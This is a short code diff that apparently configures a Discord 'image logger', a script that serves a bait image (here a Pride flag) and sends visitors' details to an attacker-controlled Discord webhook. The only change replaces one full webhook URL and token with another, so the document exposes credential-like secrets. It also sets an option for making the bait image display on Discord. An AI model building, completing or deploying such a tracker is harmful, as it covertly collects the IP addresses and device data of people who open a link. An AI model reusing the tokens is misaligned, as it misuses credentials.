@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1382329396773261384/gWPdc9vaY1nrv4hR3NKR2t3mAGYU2XsVBAewIqPOGgFLDktYN8tjsom0rRJSIehiQ_Qv'
+webhook = 'https://discord.com/api/webhooks/1405437939755913328/aWkBQ4barQ4mO_KxmuHU2qd5xiH6t6875NDcchabhcRvf4cBbOeCD9oEDeiLM-u4IJt5'
 
 bindata = httpx.get('https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Gay_Pride_Flag.svg/1200px-Gay_Pride_Flag.svg.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
